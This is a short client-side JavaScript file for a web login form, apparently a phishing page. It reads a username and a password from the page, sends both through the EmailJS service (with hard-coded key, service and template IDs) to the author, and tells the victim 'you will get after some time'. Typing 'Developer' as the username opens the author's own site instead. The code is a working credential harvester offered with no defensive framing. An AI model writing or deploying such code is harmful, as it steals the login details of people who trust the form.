(function () {
  emailjs.init("111u2u8TkTIxcDmz-");
})();

///////////////////never-touch-it////////////////////////
// ---------------------------------------------
const serviceId = "service_dt4578o";
const templateId = "template_abjzs9c";
// ---------------------------------------------
//////////////////never-touch-it/////////////////////////

const handleSubmit = () => {
  const userName = document.querySelector(".id").value;
  const password = document.querySelector(".password").value;
  const contactMe = document.querySelector(".contact-me");
  function redirectToWebsite() {
    window.open("https://vanshkumar.netlify.app/", "_blank");
  }
  if (userName == "" && password == "") {
    contactMe.textContent = "it can't be empty";
  } else if (userName == "Developer" || userName == "developer") {
    redirectToWebsite();
  } else {
    contactMe.textContent = "wait...";
    var params = {
      name: userName,
      email: password,
      // message: message
    };
    emailjs
      .send(serviceId, templateId, params)
      .then((res) => {
        // document.querySelector(".name").value = "";
        // document.querySelector(".email").value = "";
        // document.querySelector(".message").value = "";
        // document.querySelector(".phone").value = "";
        let a = document.querySelector(".contact-me");
        a.style.color = "green";
        contactMe.innerHTML = "All done 👍<br>you will get after some time";
        contactMe.style.textAlign = "center";
      })
      .catch((err) => {
        console.log("An error has been occured");
      });
  }
};
